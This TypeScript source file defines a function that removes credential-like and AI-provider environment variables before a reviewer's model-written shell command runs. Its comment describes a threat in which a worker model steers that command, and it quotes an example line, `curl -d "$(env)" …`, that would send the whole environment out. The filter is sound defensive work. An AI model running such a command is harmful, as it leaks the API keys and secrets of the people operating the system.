/**
 * An environment for a command a model wrote, without Maat's credentials.
 *
 * A reviewer's objection command is model-authored shell text, and the
 * reviewer read the worker's claim and output, so the worker can steer it.
 * It runs in a throwaway copy of the tree, but with Maat's own environment
 * it could read every API key Maat holds (`curl -d "$(env)" …`). This drops
 * anything that names itself a credential, and the provider variables Maat
 * reads its keys and endpoints from. PATH, HOME, locale and the like stay:
 * the command still has to run.
 */
const SECRET_NAME = /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH|COOKIE|SESSION|DSN|DATABASE_URL|PRIVATE)/i;
const PROVIDER_PREFIX = /^(MAAT_|MOLT_|OPENAI|ANTHROPIC|OPENROUTER|XAI|GROK|GEMINI|GOOGLE|AWS|AZURE|GCP|DEEPSEEK|MISTRAL|GROQ|TOGETHER|FIREWORKS|HF_|HUGGING|OPENCODE|GH_|GITHUB|NPM_|CLOUDFLARE|CF_)/i;

export function credentialFreeEnv(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) continue;
    if (SECRET_NAME.test(k) || PROVIDER_PREFIX.test(k)) continue;
    out[k] = v;
  }
  return out;
}
